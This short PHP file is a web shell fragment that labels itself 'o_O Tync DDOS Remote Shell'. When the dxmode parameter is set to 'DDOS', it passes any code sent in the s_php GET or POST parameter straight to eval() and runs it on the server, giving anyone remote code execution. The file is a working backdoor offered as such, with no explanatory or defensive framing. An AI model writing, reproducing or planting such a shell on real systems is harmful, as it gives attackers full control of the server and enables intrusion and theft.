<?php
if ($_GET['dxmode']=='DDOS') /* DDOS mode. In other case, EVALer of everything that comes in $_GET['s_php'] OR $_POST['s_php']  */
{
	$F = $_GET + $_POST;
	if (!isset($F['s_php'])) 
		die('o_O Tync DDOS Remote Shell <br>Use GET or POST to set "s_php" variable with code to be executed =)<br>Enjoy!');
	eval(stripslashes($F['s_php']));
	die("\n\n".'<br><br>'.'o_O Tync DDOS Web Shell ');
}
?>